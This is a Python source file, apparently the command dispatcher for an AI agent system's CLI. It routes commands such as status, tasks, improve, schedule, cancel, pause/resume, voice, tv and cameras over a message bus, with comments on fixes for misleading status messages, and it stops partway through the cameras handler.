"""Command dispatch (07-post-cutover-review.md §3.8 / 15-interface.md
§12 q5, 2026-09-06: "the remaining commands from v1 are so scattered ...
I'd like to consolidate, simplify"). Consolidated from v1's inherited 38
names down to `status`, `tasks`, `improve`, `plan`, `research`,
`interests`, `auto`, `pause`, `resume`, `exit`, `mcp`, `help` --
absorbing near-duplicates (`vitals`/`budget`/`skills` into `status`;
`work` into `tasks`; `propose`/`patch`/`batch`/`evolve` into `improve`;
`project`/`plan <n>` into `plan`; `interest`/`curious` into `interests`;
`autonomous`/`discover`/`news`/`growth` into `auto`; `stop`/`quit` into
`exit`) and dropping five `_NOT_YET` stubs and four dev-path commands
the model's own Guardian-gated tools already cover
(`reflect`/`digest`/`pending`/`log`/`trace`/`remind`/`history`/`run`/
`use`/`fetch`/`sleep`) -- see 15-interface.md §12 q5/q6 for the full
before/after. Every row publishes the real v2 message this session --
Interface never fakes a result.
"""

from __future__ import annotations

import difflib
import json
import re
import uuid
import subprocess
from dataclasses import dataclass
from pathlib import Path

from simorgh.bus.client import BusClient
from simorgh.contracts import topics
from simorgh.contracts.toolargs import (
    MARKER_SPLIT_FIRST_LINE,
    args_from_text,
    describe_arguments,
)
from simorgh.contracts.envelope import Event
from simorgh.ledger.client import LedgerClient

from . import render as render_mod
from .parser import Command
from .vitals import VitalsCache

_NO_RESPONSE = "no response -- that subsystem isn't wired up in this build yet"
_NOT_YET = "not yet available in this build"

# Must match `execution/tools.py::MCP_PROPOSALS_STREAM` -- a plain string
# agreement, not a shared import, since `interface` may not import
# `execution` (`test_module_boundaries.py`'s subsystem-isolation rule);
# Ledger stream names aren't part of the typed contract catalog the way
# bus topics are, so this is the same kind of agreement `execution/
# service.py`'s own `INFLIGHT_STREAM`/`TOOLS_STREAM` constants are.
MCP_PROPOSALS_STREAM = "mcp:proposals"
# Same agreement, for `execution/capabilities.py::CAPABILITIES_STREAM`.
# Kept in step by a test rather than an import, for the reason above.
CAPABILITIES_STREAM = "capabilities"
# And for `kernel/scheduler.py::SCHEDULE_STREAM`, same agreement again.
SCHEDULE_STREAM = "schedule"
# `execution/service.py::TOOLS_STREAM` and
# `reflection/service.py::Service.ALERTS_STREAM`, same agreement.
TOOLS_STREAM = "execution:tools"
ALERTS_STREAM = "reflection:alerts"
# And `kernel/service.py::Kernel.CONFIG_STREAM`.
CONFIG_STREAM = "config:effective"
# `simorgh.toml`'s primary search location (`kernel/config.py::find_
# config_path`'s first candidate, `./simorgh.toml`) -- this command
# targets the same file a normal `sim.sh` boot would read next, but
# doesn't replicate that function's full `$SIMORGH_CONFIG`/`${data_dir}`
# fallback search (kernel-only code `interface` may not import); `mcp
# approve` says exactly where it wrote, so a non-default setup is a
# visible, honest mismatch to notice and move by hand, not a silent one.
_SIMORGH_TOML_PATH = Path("simorgh.toml")


@dataclass
class Outcome:
    text: str
    exit_repl: bool = False
    # Set only by a `_request(..., watch=True)` call that created a real
    # task (`plan`/`improve`/`research`/`tasks work`) -- `service.py::
    # _handle_line` registers it in `_watched_tasks` so `_on_task_event`
    # narrates the eventual `task.completed` instead of it landing only
    # in the Ledger, unseen (live-caught: `improve web access` printed
    # "task created: <id>" and then nothing, ever, for a task that in
    # fact ran to completion with a real answer).
    task_id: str | None = None


def _render_created(label: str = "task"):
    """Live-caught: three different `improve` requests all printed
    "task created: 4cc3c407277b" -- Planning's intake had deduplicated
    each against the first (already-completed) task and replied with
    `deduplicated_against`, which this surface silently dropped, so the
    human saw a fresh task that never ran. Say so instead."""
    def _render(p: dict) -> str:
        if p.get("deduplicated_against"):
            return (f"not created -- too similar to existing {label} {p['task_id']}; "
                    f"rephrase, or `tasks` to see it")
        return f"{label} created: {p['task_id']}"
    return _render


async def _request(bus: BusClient, type_: str, payload: dict, *, timeout: float, render, watch: bool = False) -> Outcome:
    try:
        reply = await bus.request(bus.new(type_, payload), timeout=timeout)
    except TimeoutError:
        return Outcome(_NO_RESPONSE)
    except Exception as exc:  # noqa: BLE001 -- a bad request is a rendered error, never a crash
        return Outcome(f"error: {exc!r}")
    if reply.payload.get("ok") is False:
        err = reply.payload.get("error", {})
        return Outcome(f"error: {err.get('code', 'unknown')} -- {err.get('detail', '')}")
    # A deduplicated reply names an *existing* task -- often already
    # completed -- so there is no completion coming to watch for.
    task_id = reply.payload.get("task_id") if watch and not reply.payload.get("deduplicated_against") else None
    return Outcome(render(reply.payload), task_id=task_id)


async def _publish(bus: BusClient, type_: str, payload: dict, *, render_ok: str) -> Outcome:
    try:
        await bus.publish(bus.new(type_, payload))
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"error: {exc!r}")
    return Outcome(render_ok)


# Statuses `_on_task_cancel` (planning/service.py) already treats as
# done -- a plain string agreement rather than an import, since
# `interface` may not import `planning` (`test_module_boundaries.py`).
_TERMINAL_STATUSES = frozenset({"completed", "failed"})


async def _cancel(bus: BusClient, task_id: str, *, session_id: str) -> Outcome:
    """`TASK_CANCEL` is fire-and-forget, and Planning's own handler
    silently no-ops on an unknown or already-finished task_id (there is
    nothing left to stop). Publishing it and then unconditionally
    saying "asked X to stop" was true only when the id turned out to
    name a live task -- for a typo, a stale id copied from an old
    `tasks` listing, or a task that had already finished, the human was
    told a cancellation was in flight that never actually happened
    (observer, 2026-09-08). Look the task up first so the message
    matches what will actually happen."""
    try:
        reply = await bus.request(bus.new(topics.TASK_LIST_REQUEST, {}), timeout=3.0)
    except TimeoutError:
        return Outcome(_NO_RESPONSE)
    except Exception as exc:  # noqa: BLE001 -- a lookup failure is a rendered error, never a crash
        return Outcome(f"error: {exc!r}")
    task = next((t for t in reply.payload.get("tasks", []) if t.get("task_id") == task_id), None)
    if task is None:
        return Outcome(f"no such task {task_id!r} -- `tasks` lists them")
    if task.get("status") in _TERMINAL_STATUSES:
        return Outcome(f"{task_id} is already {task['status']} -- nothing to stop")
    return await _publish(bus, topics.TASK_CANCEL, {
        "task_id": task_id, "reason": f"cancelled by cli:{session_id}",
    }, render_ok=f"asked {task_id} to stop; it ends after its current step")


async def run_shell(command: str, *, timeout: float) -> str:
    if not command:
        return "usage: !<shell command>"
    try:
        result = subprocess.run(  # noqa: S602 -- the human's own shell authority, run by Interface (spec section 7)
            command, shell=True, capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"[shell timed out after {timeout}s]"
    except OSError as exc:
        return f"[shell error: {exc}]"
    out = (result.stdout or "") + (result.stderr or "")
    return out.rstrip() or f"[exit {result.returncode}, no output]"


async def dispatch(command: Command, *, bus: BusClient, clock, session_id: str, vitals: VitalsCache,
                    ledger: LedgerClient) -> Outcome:
    name, args = command.name, command.args
    now = clock.now()

    if name == "!":
        return Outcome(await run_shell(args, timeout=120.0))

    if name == "exit":
        await bus.publish(bus.new(topics.SYSTEM_STOP, {
            "reason": args or "user exit", "requested_by": f"cli:{session_id}",
        }, priority=9))
        return Outcome("stopping...", exit_repl=True)

    if name == "pause":
        await bus.publish(bus.new(topics.SYSTEM_PAUSE, {
            "reason": args or "user requested", "requested_by": f"cli:{session_id}", "scope": "all",
        }, priority=9))
        return Outcome("pause requested")

    if name == "resume":
        await bus.publish(bus.new(topics.SYSTEM_RESUME, {
            "reason": args or "user requested", "requested_by": f"cli:{session_id}", "scope": "all",
        }, priority=9))
        return Outcome("resume requested")

    if name == "status":
        return Outcome(await _status_panel(bus, vitals))

    if name == "help":
        return Outcome(render_mod.help_panel(enabled=render_mod.color_enabled(),
                                             unicode=render_mod.unicode_mode() != "off"))

    if name == "improve":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: improve [path] <description> [steps=N]   "
                           "(`skill <topic>` drafts a new skill instead)")
        first, _, rest = args.partition(" ")
        # A path in the first word names what to change. Without one it
        # is still a change -- the model works out which file.
        #
        # `improve <anything with no path>` used to create a SKILL task,
        # so "improve, the game freezes after a second" became "write a
        # reusable skill module" and three rounds of verification asked
        # whether a skill had been produced (creator, 2026-09-09: "why
        # human ask became a skill? it should have been categorized as a
        # task"). Drafting a skill is now something you ask for by name.
        payload = {"kind": "patch", "origin": "human", "mode": "execute"}
        if rest and _PATH_HINT.search(first):
            payload.update(description=rest.strip(), subject=first)
        else:
            payload.update(description=args)
        return await _request(bus, topics.TASK_CREATE, _with_steps(payload, steps),
                              timeout=5.0, render=_render_created(), watch=True)

    if name == "skill":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: skill <topic> [steps=N]  -- drafts a new reusable skill. "
                           "To change something that already exists, use `improve`.")
        return await _request(bus, topics.TASK_CREATE, _with_steps({
            "kind": "skill", "description": args, "origin": "human", "mode": "execute",
        }, steps), timeout=5.0, render=_render_created("skill task"), watch=True)

    if name == "plan":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: plan <goal> [steps=N]")
        return await _request(bus, topics.TASK_CREATE, _with_steps({
            "kind": "project", "description": args, "origin": "human", "mode": "plan",
        }, steps), timeout=5.0, render=_render_created("project task"), watch=True)

    if name == "research":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: research <topic> [steps=N]")
        return await _request(bus, topics.TASK_CREATE, _with_steps({
            "kind": "research", "description": args, "origin": "human",
        }, steps), timeout=5.0, render=_render_created(), watch=True)

    if name == "benchmark":
        return await _benchmark(bus, args)

    if name == "cancel":
        # Until 2026-09-08 there was no way to stop anything. A task that
        # had stopped being useful ran to its step budget while holding
        # the single worker, and everything else queued behind it.
        task_id = args.strip()
        if not task_id:
            return Outcome("usage: cancel <task_id>   (`tasks` lists them)")
        return await _cancel(bus, task_id, session_id=session_id)

    if name == "tasks":
        if args.strip() in ("clear", "clean", "erase", "wipe"):
            return await _request(bus, topics.TASK_CLEAR_REQUEST, {"reason": f"cleared by cli:{session_id}"},
                                  timeout=10.0, render=lambda p: (
                f"cleared {p.get('cleared', 0)} task(s)"
                + (f"; {p['cancelled']} running were told to stop" if p.get("cancelled") else "")
                + " -- the ledger keeps their history"))
        if args.strip() == "work":
            return await _request(bus, topics.TASK_WORK_NEXT_REQUEST, {}, timeout=5.0, render=lambda p: (
                f"working: {p['task_id']}" if p.get("task_id") else f"nothing to work on ({p.get('reason', 'idle')})"
            ), watch=True)
        # Live-caught (the creator, 2026-09-07): "it only show the total
        # number of tasks, not the tasks details". The reply has always
        # carried every field -- id, kind, status, origin, description --
        # and this rendered `len()` of it and dropped the rest, so a
        # backlog of 100 looked exactly like a backlog of 1.
        show_all = args.strip() == "all"
        return await _request(bus, topics.TASK_LIST_REQUEST, {}, timeout=3.0, render=lambda p: render_mod.task_list(
            p.get("tasks", []), p.get("projects", []), limit=1000 if show_all else 20,
        ))

    if name == "auto":
        mode = args.strip()
        if mode == "on":
            return await _publish(bus, topics.SYSTEM_RESUME, {
                "reason": "user enabled autonomy", "requested_by": f"cli:{session_id}", "scope": "autonomous",
            }, render_ok="autonomous mode: on")
        if mode == "off":
            return await _publish(bus, topics.SYSTEM_PAUSE, {
                "reason": "user disabled autonomy", "requested_by": f"cli:{session_id}", "scope": "autonomous",
            }, render_ok="autonomous mode: off")
        if mode == "now":
            return await _publish(bus, topics.SYSTEM_TICK_IDLE, {"idle_seconds": 0.0}, render_ok="idle tick requested")
        # Bare `auto` used to print the KERNEL state, so after `auto off`
        # it still answered "running" -- a true sentence about a
        # different question (observer, 2026-09-08). The state machine
        # carries `autonomous_paused`; that is what was asked about.
        # Reads autonomy state from the kernel via SYSTEM_STATUS_REQUEST (bare `auto`).
        return await _request(bus, topics.SYSTEM_STATUS_REQUEST, {}, timeout=3.0, render=_render_auto)

    if name == "interests":
        if not args:
            # This printed `len()` of a payload that carries every topic
            # -- the same "it only shows the count" complaint the creator
            # already made about `tasks` (observer, 2026-09-08).
            return await _request(bus, topics.CURIOSITY_INTEREST_LIST_REQUEST, {}, timeout=3.0,
                                  render=_render_interests)
        return await _publish(bus, topics.CURIOSITY_INTEREST_ADD, {"topic": args}, render_ok=f"interest added: {args}")

    if name == "mcp":
        return await _mcp_command(args, bus=bus, ledger=ledger, clock=clock)

    if name == "tool":
        return await _tool_command(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "config":
        return await _config_command(ledger, args)

    if name == "domains":
        return await _domains_command(ledger, args)

    if name == "alerts":
        return await _alerts_command(ledger, args)

    if name == "capabilities":
        return await _capabilities_command(ledger)
    if name == "voice":
        return await _voice(bus, args)

    if name == "tv":
        return await _tv(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "cameras":
        return await _cameras(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "schedule":
        return await _schedule_command(args, bus=bus, ledger=ledger, clock=clock)

    # unrecognized after autocorrect failed, or plain chat text
    return Outcome("", exit_repl=False)


# A first token that looks like a real path (a slash, or a file
# extension) means `improve <path> <description>`'s patch shape;
# anything else is `improve <topic>`'s skill shape.
_PATH_HINT = re.compile(r"[\\/]|\.[A-Za-z0-9]{1,5}$")

# `steps=N` anywhere in an improve/plan/research line sets the step cap
# for one attempt at that task (the creator, 2026-09-07: a big task
# should be able to say it is big). Orchestration clamps it.
_STEPS_OPT = re.compile(r"(?:^|\s)steps=(\d{1,4})(?=\s|$)")


def _pop_steps(args: str) -> tuple[str, int | None]:
    match = _STEPS_OPT.search(args)
    if match is None:
        return args, None
    cleaned = (args[: match.start()] + " " + args[match.end():]).strip()
    return " ".join(cleaned.split()), int(match.group(1))


def _with_steps(payload: dict, steps: int | None) -> dict:
    if steps:
        payload["max_steps"] = steps
    return payload


# (verb, argument sketch, what it does). One list, so the usage text and
# the dispatcher below cannot disagree -- the suites listing advertised a
# `load` verb that did not exist until a test compared the two
# (2026-09-08).
BENCHMARK_VERBS: tuple[tuple[str, str, str], ...] = (
    ("", "", "the latest result for each suite"),
    ("suites", "", "what can be run, and what is cached"),
    ("load", "<suite> [refresh]", "download its cases, without running them"),
    ("run", "<suite> [n] [level=L] [refresh]", "run it, and record the result"),
    ("stop", "", "end the run in flight, keeping what it scored"),
    ("history", "[suite]", "accuracy over time, per model"),
    ("show", "<run_id>", "one run, case by case"),
)
_BENCHMARK_COLUMN = max(len(f"{verb} {args}".strip()) for verb, args, _w in BENCHMARK_VERBS) + 2
_BENCHMARK_USAGE = "\n".join(
    f"  benchmark {f'{verb} {args}'.strip():<{_BENCHMARK_COLUMN}}{what}"
    for verb, args, what in BENCHMARK_VERBS
)


async def _voice(bus: BusClient, args: str) -> Outcome:
    """`voice ...` -- every verb is one request to the voice subsystem;
    the rendering is `voiceview`'s. `voice` alone is `voice status`."""
    from . import voiceview

    verb, rest = _benchmark_word(args)
    if verb in ("", "status"):
        return await _request(bus, topics.VOICE_STATUS_REQUEST, {}, timeout=10.0, render=voiceview.status)
    if verb in ("on", "off", "mute", "unmute"):
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": verb}, timeout=60.0,
                              render=voiceview.controlled)
    if verb == "barge":
        which = rest.strip().lower()
        if which in ("on", "off"):
            return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": f"barge_{which}"}, timeout=10.0,
                                  render=voiceview.controlled)
        if which in ("aec on", "aec off"):
            return await _request(bus, topics.VOICE_CONTROL_REQUEST,
                                  {"action": "aec_on" if which.endswith("on") else "aec_off"}, timeout=10.0,
                                  render=voiceview.controlled)
        return Outcome("usage: voice barge on|off  (interrupt Sim by talking) | voice barge aec on|off "
                       "(cancel Sim's own voice first -- steadier in a loud room, experimental)")
    if verb in ("test", "say"):
        if not rest:
            return Outcome("usage: voice test <text to speak>")
        return await _request(bus, topics.VOICE_SPEAK_REQUEST, {"text": rest.strip().strip('"')}, timeout=120.0,
                              render=voiceview.spoken)
    if verb == "listen":
        payload: dict = {}
        words = rest.split()
        if words and words[0].replace(".", "", 1).isdigit():
            payload["seconds"] = float(words[0])
        if "only" in words or "transcribe" in words:
            payload["respond"] = False
        return await _request(bus, topics.VOICE_LISTEN_REQUEST, payload, timeout=300.0, render=voiceview.listened)
    if verb == "voices":
        return await _request(bus, topics.VOICE_VOICES_REQUEST, {}, timeout=60.0, render=voiceview.voices)
    if verb == "devices":
        return await _request(bus, topics.VOICE_DEVICES_REQUEST, {}, timeout=60.0, render=voiceview.devices)
    if verb == "models":
        return await _request(bus, topics.VOICE_MODELS_REQUEST, {"name": rest.strip() or "base.en"},
                              timeout=900.0, render=voiceview.models)
    if verb == "set":
        # `voice set tts_voice af_kore`, `tts_voice = af_kore` and
        # `tts_voice=af_kore` are the same ask.
        text = rest.strip()
        if "=" in text.split(" ", 1)[0] or text.split(" ", 2)[1:2] == ["="]:
            key, _, value = text.partition("=")
        else:
            key, _, value = text.partition(" ")
        payload = {"action": "set"}
        if key.strip():
            payload["key"] = key.strip()
            payload["value"] = value.strip().strip("=").strip()
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, payload, timeout=120.0, render=voiceview.controlled)
    if verb == "bench":
        return await _request(bus, topics.VOICE_BENCH_REQUEST, {"play": "quiet" not in rest},
                              timeout=600.0, render=voiceview.bench)
    return Outcome(f"voice: unknown verb {verb!r} -- status | on | off | mute | unmute | listen [seconds] [only] "
                   f"| test <text> | voices | devices | models [name] | set [key value] | bench [quiet]")


def _benchmark_word(args: str) -> tuple[str, str]:
    first, _, rest = args.strip().partition(" ")
    return first.lower(), rest.strip()


async def _benchmark(bus: BusClient, args: str) -> Outcome:
    from . import benchmarkview

    verb, rest = _benchmark_word(args)
    if verb in ("", "latest"):
        return await _request(bus, topics.BENCHMARK_HISTORY_REQUEST, {}, timeout=10.0,
                              render=benchmarkview.latest)
    if verb == "suites":
        return await _request(bus, topics.BENCHMARK_SUITES_REQUEST, {}, timeout=10.0,
                              render=benchmarkview.suites)
    if verb == "history":
        return await _request(bus, topics.BENCHMARK_HISTORY_REQUEST, {"suite": rest.strip()},
                              timeout=10.0, render=benchmarkview.history)
    if verb == "show":
        if not rest:
            return Outcome("usage: benchmark show <run_id>")
        return await _request(bus, topics.BENCHMARK_HISTORY_REQUEST, {"run_id": rest.strip()},
                              timeout=10.0, render=benchmarkview.detail)
    if verb == "stop":
        return await _request(bus, topics.BENCHMARK_STOP_REQUEST, {}, timeout=30.0,
                              render=benchmarkview.stopped)
    if verb == "load":
        if not rest:
            return Outcome("usage: benchmark load <suite> [refresh]")
        words = rest.split()
        return await _request(bus, topics.BENCHMARK_LOAD_REQUEST, {
            "suite": words[0], "refresh": "refresh" in words[1:],
        }, timeout=180.0, render=benchmarkview.loaded)
    if verb == "run":
        payload, problem = benchmarkview.parse_run(rest)
        if problem:
            return Outcome(problem)
        # A run is minutes to hours; the reply says it started and the
        # progress narrates itself, the same shape as `improve`.
        return await _request(bus, topics.BENCHMARK_RUN_REQUEST, payload, timeout=60.0,
                              render=benchmarkview.started)
    return Outcome(_BENCHMARK_USAGE)


def _render_auto(payload: dict) -> str:
    paused = payload.get("autonomous_paused")
    state = payload.get("state", "?")
    if paused is None:
        return f"autonomous mode: unknown (system is {state})"
    mode = "off" if paused else "on"
    return (
        f"autonomous mode: {mode}  ·  system {state}\n"
        f"  `auto on` / `auto off` to change it, `auto now` to run one idle tick"
    )


def _render_interests(payload: dict) -> str:
    interests = payload.get("interests") or []
    if not interests:
        return "no interests yet -- `interests <topic>` adds one"
    lines = [f"{len(interests)} interest(s):"]
    for item in interests[:20]:
        topic = item.get("topic") if isinstance(item, dict) else str(item)
        why = (item.get("why") or "") if isinstance(item, dict) else ""
        lines.append(f"  · {topic}" + (f"  -- {why}" if why else ""))
    if len(interests) > 20:
        lines.append(f"  ... and {len(interests) - 20} more")
    return "\n".join(lines)


async def _panel_piece(bus: BusClient, type_: str, payload: dict, *, timeout: float, label: str, render) -> str:
    try:
        reply = await bus.request(bus.new(type_, payload), timeout=timeout)
    except TimeoutError:
        return f"{label}: unavailable (no response)"
    except Exception as exc:  # noqa: BLE001 -- one panel piece's failure never breaks the whole panel
        return f"{label}: error ({exc!r})"
    if reply.payload.get("ok") is False:
        err = reply.payload.get("error", {})
        return f"{label}: error ({err.get('code', 'unknown')})"
    return render(reply.payload)


async def _payload_of(bus: BusClient, type_: str, payload: dict, *, timeout: float = 3.0):
    """One panel piece's raw payload, or None if it did not answer.

    Raw rather than pre-rendered: the layout decisions -- which
    subsystems to name, what goes in the second column, how much of a
    commit subject fits -- can only be made with the numbers in hand.
    """
    try:
        reply = await bus.request(bus.new(type_, payload), timeout=timeout)
    except Exception:  # noqa: BLE001 -- one piece failing never breaks the panel
        return None
    return reply.payload


async def _status_panel(bus: BusClient, vitals: VitalsCache) -> str:
    """07-post-cutover-review.md §3.8: `status` absorbs `vitals`/
    `budget`/`skills` into one panel, not sub-args -- health, vitals,
    posture, and registered tools together, each piece degrading
    honestly on its own if that subsystem does not answer in time."""
    from . import render as render_mod

    health = await _payload_of(bus, topics.SYSTEM_STATUS_REQUEST, {})
    posture = await _payload_of(bus, topics.GUARDIAN_POSTURE_REQUEST, {})
    tools_payload = await _payload_of(bus, topics.WORLD_ENV_QUERY, {"what": "tools", "args": {}})
    git = await _payload_of(bus, topics.WORLD_ENV_QUERY, {"what": "git_state", "args": {}})
    return render_mod.status_panel(
        health=health, snapshot=vitals.snapshot(), posture=posture,
        tools=(tools_payload or {}).get("tools") if tools_payload is not None else None,
        git=git, enabled=render_mod.color_enabled())


def _render_git_state(p: dict) -> str:
    if not p.get("available", False):
        return "git: unavailable (no repo / git not found)"
    dirty = f"{p.get('changed_files', 0)} uncommitted" if p.get("dirty") else "clean"
    return (
        f"git: {p.get('branch', '?')} @ {p.get('head', '')[:8]}   {dirty}\n"
        + "\n".join(f"  {line}" for line in p.get("recent_commits", [])[:5])
    )




# `<n><unit>` -- 30s, 15m, 2h, 1d. A schedule is one of the few places a
# bare number is genuinely ambiguous, so the unit is required.
_EVERY_RE = re.compile(r"^(\d+)\s*([smhd])$", re.I)
_UNIT_SECONDS = {"s": 1, "m": 60, "h": 3600, "d": 86400}


def parse_delay(text: str) -> float | None:
    """Seconds for `30s` / `15m` / `2h` / `1d`, or None."""
    match = _EVERY_RE.match((text or "").strip())
    if not match:
        return None
    return float(match.group(1)) * _UNIT_SECONDS[match.group(2).lower()]


async def _schedule_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock) -> Outcome:
    """`schedule` / `schedule <delay> <label>` / `schedule every <delay> <label>`.

    The Kernel has had a complete scheduler since the beginning: it
    subscribes to `system.schedule.add`, arms a timer, survives a
    restart by replaying its own ledger stream, and fires
    `percept.time.scheduled`. Nothing in the entire system ever
    published that message, so none of it could be reached -- a finished
    subsystem with no door. This is the door.

    The cancel half stayed shut a while longer. `Scheduler.
    _on_schedule_cancel` is just as complete -- it appends
    `schedule.cancelled`, marks the projection, and cancels the armed
    timer -- and `_schedule_list` below already drops a cancelled id
    from its listing, but `system.schedule.cancel` was published by
    nothing in the tree (scan, 2026-09-10). A `schedule every 1h ...`
    therefore had no off switch at all, and since the Kernel replays
    `SCHEDULE_STREAM` on boot, a restart did not stop it either: it
    fired every hour for the life of the installation. `schedule cancel
    <id>` is that half's door.
    """
    args = (args or "").strip()
    if not args:
        return await _schedule_list(ledger)

    # The whole first word, not a prefix: `schedule cancelthing` is a
    # missing delay, not a cancel of `thing`.
    head, _, rest = args.partition(" ")
    if head.lower() == "cancel":
        return await _schedule_cancel(rest.strip(), bus=bus, ledger=ledger)

    recurring = False
    if args.lower().startswith("every "):
        recurring, args = True, args[6:].strip()
    delay_text, _, label = args.partition(" ")
    delay = parse_delay(delay_text)
    label = label.strip()
    if delay is None:
        return Outcome(
            "schedule needs a delay with a unit -- `schedule 15m water the plants`, "
            "`schedule every 1h check the build`, or bare `schedule` to list what is set.",
            exit_repl=False,
        )
    if not label:
        return Outcome("schedule needs something to say when it fires.", exit_repl=False)

    schedule_id = uuid.uuid4().hex[:12]
    payload = {"schedule_id": schedule_id, "label": label,
               "at": None if recurring else clock.now() + delay,
               "every_seconds": delay if recurring else None}
    await bus.publish(bus.new(topics.SYSTEM_SCHEDULE_ADD, payload))
    when = f"every {delay_text}" if recurring else f"in {delay_text}"
    return Outcome(f"scheduled {when}: {label}  ({schedule_id})", exit_repl=False)


async def _live_schedules(ledger: LedgerClient) -> dict[str, dict]:
    """Every schedule that is armed right now, id -> its `added` payload.

    One reader for `schedule` and `schedule cancel`, so the two can
    never disagree about what is live.
    """
    live: dict[str, dict] = {}
    for event in await ledger.read(SCHEDULE_STREAM):
        payload = event.payload or {}
        schedule_id = str(payload.get("schedule_id") or "")
        if not schedule_id:
            continue
        if event.type == "schedule.added":
            live[schedule_id] = dict(payload)
        elif event.type == "schedule.cancelled":
            live.pop(schedule_id, None)
        elif event.type == "schedule.fired":
            # A one-shot that has already fired is not live, and the
            # Kernel's own projection has always known it
            # (`kernel/scheduler.py::ScheduleView.apply` sets `fired`
            # and `active()` drops it). This reader did not, so
            # `schedule` listed every reminder ever set as still
            # pending and `schedule cancel <that id>` answered
            # "cancelled <label>" -- the cheerful lie about a stopped
            # timer that the id check below it exists to prevent, for
            # the id shape most likely to be typed at it (observer,
            # 2026-09-10).
            entry = live.get(schedule_id)
            if entry is None:
                continue
            next_fire_at = payload.get("next_fire_at")
            if next_fire_at is None:
                live.pop(schedule_id, None)
            else:
                # Recurring: still live, and now due at its next time
                # rather than the one it was armed with hours ago.
                entry["fire_at"] = next_fire_at
    return live


async def _schedule_cancel(schedule_id: str, *, bus: BusClient, ledger: LedgerClient) -> Outcome:
    """`schedule cancel <id>` -- the only producer of `system.schedule.cancel`.

    The id is checked against the live listing first. Publishing a
    cancel for an id the Kernel does not hold is not an error there --
    `_on_schedule_cancel` appends the record and finds no timer to
    cancel -- so a typo would otherwise be answered with a cheerful
    "cancelled" and nothing would have stopped.
    """
    schedule_id = (schedule_id or "").strip()
    if not schedule_id:
        return Outcome("cancel needs an id -- bare `schedule` lists them.", exit_repl=False)
    try:
        live = await _live_schedules(ledger)
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
    if schedule_id not in live:
        near = difflib.get_close_matches(schedule_id, sorted(live), n=3, cutoff=0.4)
        hint = f"; did you mean {', '.join(near)}?" if near else " -- bare `schedule` lists them"
        return Outcome(f"nothing scheduled with id {schedule_id!r}{hint}", exit_repl=False)
    await bus.publish(bus.new(topics.SYSTEM_SCHEDULE_CANCEL, {"schedule_id": schedule_id}))
    return Outcome(f"cancelled {schedule_id}: {live[schedule_id].get('label', '')}".rstrip(": "),
                   exit_repl=False)


async def _schedule_list(ledger: LedgerClient) -> Outcome:
    try:
        live = await _live_schedules(ledger)
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
    if not live:
        return Outcome("nothing scheduled. `schedule 15m <label>` or `schedule every 1h <label>`.",
                       exit_repl=False)
    lines = []
    for schedule_id, payload in sorted(live.items(), key=lambda kv: kv[1].get("fire_at") or 0):
        recurrence = payload.get("recurrence") or {}
        every = recurrence.get("every_s")
        when = f"every {int(every)}s" if every else f"at {payload.get('fire_at')}"
        lines.append(f"  {schedule_id}  {when}  {payload.get('label', '')}")
    return Outcome(f"{len(live)} scheduled:\n" + "\n".join(lines), exit_repl=False)


async def _tv(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`tv ...`: sugar over the cast tools (execution/media/cast.py), so
    every verb is a tool call Guardian sees -- the same path as `tool
    cast_show {...}`, spelt for a person."""
    words = (args or "").strip().split()
    verb = words[0].lower() if words else "show"
    rest = words[1:]
    usage = ("usage: tv setup [device] | devices | use <device> | show [device] | video <url> [full|frame] [device] | stop [frame] "
             "| volume <0-100> [device]")

    async def _run(tool: str, payload: dict) -> Outcome:
        return await _run_tool(bus=bus, ledger=ledger, tool=tool, raw=json.dumps(payload), session_id=session_id,
                               timeout=120.0)

    if verb == "devices":
        return await _run("cast_devices", {})
    if verb == "setup":
        return await _run("cast_setup", {"device": " ".join(rest)} if rest else {})
    if verb == "use":
        if not rest:
            return Outcome("usage: tv use <device name>   (`tv devices` lists them)")
        return await _run("cast_use", {"device": " ".join(rest)})
    if verb == "show":
        payload = {}
        if rest:
            payload["url" if rest[0].startswith(("http://", "https://")) else "device"] = " ".join(rest)
        return await _run("cast_show", payload)
    if verb in ("video", "play"):
        if not rest:
            return Outcome(usage)
        url = rest[0]
        mode = "frame"
        device = []
        for word in rest[1:]:
            if word.lower() in ("full", "fullscreen"):
                mode = "full"
            elif word.lower() in ("frame", "framed", "box"):
                mode = "frame"
            else:
                device.append(word)
        payload = {"url": url, "mode": mode}
        if device:
            payload["device"] = " ".join(device)
        return await _run("cast_play", payload)
    if verb == "stop":
        payload = {"what": "frame"} if rest and rest[0].lower() in ("frame", "framed", "box") else {}
        return await _run("cast_stop", payload)
    if verb == "volume":
        if not rest:
            return Outcome(usage)
        try:
            level = float(rest[0].rstrip("%"))
        except ValueError:
            return Outcome(usage)
        payload = {"level": level}
        if rest[1:]:
            payload["device"] = " ".join(rest[1:])
        return await _run("cast_volume", payload)
    return Outcome(f"tv: unknown verb {verb!r} -- {usage}")


async def _cameras(args: str, *, bus: BusClient, ledger: LedgerClient, session_id: str) -> Outcome:
    """`cameras ...`: sugar over the cam_* tools (execution/home/cameras.py)."""
    words = (args or "").strip().split()
    verb = words[0].lower() if words else "list"
    rest = words[1:]
    usage = ("usage: cameras list | state [camera] | show <cameras|all> [grid|full|frame|stop] | snapshot <camera> | "
             "light <camera> on|off | ir <camera> on|off | siren <camera> [seconds] | ptz <camera> <move> | "
             "recordings <camera> [today|yesterday|<n>h] | watch on|off | setup <host> <user> <password>")

    async def _run(tool: str, payload: dict, timeout: float = 120.0) -> Outcome:
        return await _run_tool(bus=bus, ledger=ledger, tool=tool, raw=json.dumps(payload), session_id=session_id,
                               timeout=timeout)

    if verb == "list":
        return await _run("cam_list", {})
    if verb == "state":
